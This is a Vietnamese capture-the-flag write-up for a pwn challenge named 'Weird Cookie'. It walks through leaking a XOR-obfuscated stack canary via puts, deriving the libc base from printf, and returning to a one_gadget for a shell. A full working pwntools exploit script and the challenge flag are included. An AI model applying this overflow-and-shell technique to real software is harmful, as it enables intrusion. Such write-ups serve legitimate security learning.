# Weird Cookie

**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/edcbeb3b-a8c4-404c-8488-6f810d893bd3)


chà tại đây có một  kiến thức mới mà ta cần biết trước khi tiến hành làm 

# XOR

**tại biến v5 và saved_canary có kí tự "^" là kí hiệu của XOR**

để tìm hiểu chi tiết về XOR thì ta có thể tham khảo wu của **@Nhatziet** 

https://github.com/trananhnhatviet/CryptoHack/blob/main/General/Xor/06_XOR%20Starter.md

**checks và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/4b16be3a-a262-4b17-b3aa-3416ad05ac6c)


**ý tưởng giải bài :**

- ở ida ta thấy của biến canary giả nằm trên rbp để ngăn ta tràn biến xuống rip, nhưng tại đây ta có thể khai thác được canary bằng cách leak nó ra từ hàm puts
- hàm puts sẽ in ra giá trị của s khi nhập vào cho đến khi gặp null byte, ta sẽ lợi dụng điều này để leak ra canary 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/c238da69-40ac-4ace-b606-c92a294cea76)


- như ảnh thì lần nhập đầu ta nhập 40byte để puts in ra canary ta cần
- từ thằng canary ta dùng XOR để leak ra địa chỉ của hàm &printf
- từ thằng printf ta sẽ tính offset để tính được địa chỉ libc
- có được địa chỉ base của libc thì sẽ khai thác như bth 

à tại đây ta cần biết thêm **1 kiến thức mới** nữa là **one_gadget**, hiểu đơn giản **one_gadget** trong file libc **là 1 cái offset trỏ đến shellcode mà chứa đầy đủ các thứ ta cần , rất đơn giản và nhanh chóng, tiện lợi**(hạn chế là không phải bài nào cũng dùng được)

![image](https://github.com/gookoosss/CTF.-/assets/128712571/37fb83f0-d323-4c30-8004-ca8b0798bbe4)



***script:***

```
from pwn import *

# p = remote(b'challenge.nahamcon.com', 30409)
exe = ELF("./weird_cookie_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
p = process('./weird_cookie_patched')

gdb.attach(p, gdbscript = '''
b*main+112
b*main+221
c
''')
input()

payload = b'a'*40 #offset đến canary 
p.send(payload) # gán vào lần nhập 1 

p.recvuntil(payload) # nhận 40byte đầu payload
canary = u64(p.recv(8)) # nhận 8byte sau của canary 
libc_printf = canary ^ 0x123456789ABCDEF1 # dùng xor để lấy được địa chỉ hàm printf
libc.address = libc_printf - 0x64e40 # tính địa chỉ base
log.info("canary: " + hex(canary))
log.info("libc printf: " + hex(libc_printf))
log.info("libc base: " + hex(libc.address))


pop_rdi = libc.address + 0x000000000002164f

#nhập lần 2
payload = b'a'*40 
payload += p64(canary)
payload += b'a'*8
# payload += p64(pop_rdi) + p64(libc.address + 0x1b3d88)

# payload += p64(libc.address + libc.sym['system'])
payload += p64(libc.address  + 0x4f302) # dùng onegadget
p.send(payload)

p.interactive()

# flag{e87923d7cd36a8580d0cf78656d457c6}

```
**(trong script mình có note lại chi tiết cách làm bài này)**

đến đây ta lấy được shell rồi lấy flag thôi

**FLAG:**

***flag{e87923d7cd36a8580d0cf78656d457c6}***





